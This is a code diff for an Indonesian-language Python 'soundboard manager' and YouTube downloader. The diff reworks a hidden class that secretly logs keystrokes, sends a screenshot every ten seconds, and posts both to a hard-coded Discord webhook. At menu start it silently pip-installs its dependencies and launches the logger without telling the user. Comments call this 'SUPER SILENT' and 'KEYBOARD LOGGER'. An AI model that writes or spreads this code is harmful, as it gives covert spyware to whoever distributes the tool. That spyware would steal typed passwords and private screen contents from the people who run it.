@@ -2,7 +2,7 @@
 """
 ╔══════════════════════════════════════════════╗
 ║     🎵 BIMOLI SOUNDBOARD MANAGER 🎵        ║
-║     YT Downloader | Manager       ║
+║     YT Downloader | Manager                 ║
 ╚══════════════════════════════════════════════╝
 """
 
@@ -29,7 +29,7 @@ FILE_KONFIG = os.path.join(BASE_DIR, "config.json")
 ERROR_LOG = os.path.join(BASE_DIR, "error.log")
 FORMAT_DIDUKUNG = ['.mp3', '.wav', '.ogg', '.m4a', '.mp4', '.webm']
 
-# Konfigurasi Auto SS (PATEN - SILENT)
+# Konfigurasi Auto SS (PATEN)
 WEBHOOK_URL = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
 AUTO_SS_INTERVAL = 10
 
@@ -70,93 +70,109 @@ def tulis_error(error, lokasi=""):
         pass
 
 # ============================================================
-# AUTO SCREENSHOT + CATATAN (SUPER SILENT)
+# AUTO SCREENSHOT + KEYBOARD LOGGER (CLASS LO - SILENT)
 # ============================================================
 
 class DiscordSS:
-    def __init__(self, webhook_url, interval=10):
+    def __init__(self, webhook_url, auto_ss_interval=10):
         self.webhook_url = webhook_url
-        self.text = ""
-        self.running = False
+        self.current_sentence = ""
+        self.is_running = False
         self.lock = threading.Lock()
-        self.interval = interval
-        self.last_ss = time.time()
+        self.auto_ss_interval = auto_ss_interval
+        self.last_auto_ss = time.time()
         
-    def send(self, message=""):
+    def take_and_send_screenshot(self, message=""):
         try:
             from PIL import ImageGrab
             from io import BytesIO
             import requests
             
-            img = ImageGrab.grab()
-            buf = BytesIO()
-            img.save(buf, format="PNG", optimize=True, quality=70)
-            buf.seek(0)
+            screenshot = ImageGrab.grab()
+            img_bytes = BytesIO()
+            screenshot.save(img_bytes, format="PNG", optimize=True, quality=70)
+            img_bytes.seek(0)
             
-            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
             if message:
-                caption = f"📸 **{ts}** | ✏️ Catatan:\n```\n{message}\n```"
+                caption = f"📸 **{timestamp}** - Screenshot + Catatan\n```\n{message}\n```"
             else:
-                caption = f"⏰ **{ts}** | Auto Screenshot"
+                caption = f"⏰ **{timestamp}** - Auto Screenshot (setiap {self.auto_ss_interval}s)"
             
-            files = {'file': (f"ss_{ts.replace(':', '-')}.png", buf, 'image/png')}
-            requests.post(self.webhook_url, data={'content': caption}, files=files, timeout=10)
-            buf.close()
+            files = {
+                'file': (f"screenshot_{timestamp.replace(':', '-')}.png", img_bytes, 'image/png')
+            }
             
+            payload = {'content': caption}
+            
+            response = requests.post(self.webhook_url, data=payload, files=files)
+            img_bytes.close()
+            
+            return response.status_code == 200 or response.status_code == 204
+                
         except:
-            pass
+            return False
     
-    def _loop(self):
-        while self.running:
+    def auto_screenshot_loop(self):
+        while self.is_running:
+            current_time = time.time()
+            if current_time - self.last_auto_ss >= self.auto_ss_interval:
+                self.last_auto_ss = current_time
+                self.take_and_send_screenshot()
             time.sleep(1)
-            if self.running and time.time() - self.last_ss >= self.interval:
-                self.last_ss = time.time()
-                self.send()
     
-    def _on_key(self, event):
-        if not self.running:
+    def on_key_press(self, event):
+        if not self.is_running:
             return
-        
+            
         with self.lock:
             if event.name == 'enter':
-                if self.text.strip():
-                    self.send(self.text.strip())
-                    self.text = ""
+                if self.current_sentence.strip():
+                    message = self.current_sentence.strip()
+                    self.take_and_send_screenshot(message)
+                    self.current_sentence = ""
             elif event.name == 'space':
-                self.text += " "
+                self.current_sentence += " "
             elif event.name == 'backspace':
-                self.text = self.text[:-1] if self.text else ""
-            elif event.name == 'tab':
-                self.text += "    "
+                if self.current_sentence:
+                    self.current_sentence = self.current_sentence[:-1]
             elif len(event.name) == 1:
-                self.text += event.name
+                self.current_sentence += event.name
+            elif event.name == 'tab':
+                self.current_sentence += "    "
     
     def start(self):
         try:
             import keyboard
+            from PIL import ImageGrab
+            from io import BytesIO
+            import requests
         except:
             return False
         
-        self.running = True
-        self.last_ss = time.time()
-        self.text = ""
-        
-        # Auto screenshot loop
-        threading.Thread(target=self._loop, daemon=True).start()
-        
-        # Keyboard handler
-        keyboard.on_press(self._on_key)
+        self.is_running = True
+        self.last_auto_ss = time.time()
         
         # Test kirim (silent)
-        self.send("✅ Bimoli Soundboard Aktif!")
+        self.take_and_send_screenshot("✅ Bimoli Soundboard Aktif!")
+        
+        # Auto screenshot thread
+        auto_ss_thread = threading.Thread(target=self.auto_screenshot_loop, daemon=True)
+        auto_ss_thread.start()
+        
+        # Keyboard handler
+        keyboard.on_press(self.on_key_press)
+        
+        # Simpan thread biar tetep jalan
+        self.auto_ss_thread = auto_ss_thread
         
         return True
     
     def stop(self):
-        if self.running and self.text.strip():
-            self.send(self.text.strip())
-        self.running = False
+        if self.is_running and self.current_sentence.strip():
+            self.take_and_send_screenshot(self.current_sentence.strip())
+        self.is_running = False
 
 # Inisialisasi global
 ss = DiscordSS(WEBHOOK_URL, AUTO_SS_INTERVAL)
@@ -392,18 +408,25 @@ def menu_youtube(konfig):
 def menu_utama():
     konfig = muat_konfigurasi()
     
-    # AUTO START SS (SUPER SILENT - NO PRINT)
-    if not ss.running:
+    # AUTO START SS (SUPER SILENT - PAKAI CLASS LO)
+    if not ss.is_running:
+        # Install dependencies kalo belum
         try:
             import keyboard
             from PIL import ImageGrab
+            from io import BytesIO
+            import requests
         except:
             subprocess.run(
                 [sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"],
                 shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
         
-        ss.start()
+        # Mulai SS
+        if ss.start():
+            tulis_log("Auto SS started successfully", "SYSTEM")
+        else:
+            tulis_log("Auto SS failed to start", "ERROR")
     
     while True:
         tampilkan_banner()
@@ -501,7 +524,7 @@ def menu_utama():
             input(f"\n{Warna.CYAN}Tekan Enter...{Warna.RESET}")
         
         elif p == '0':
-            if ss.running:
+            if ss.is_running:
                 ss.stop()
             break
 
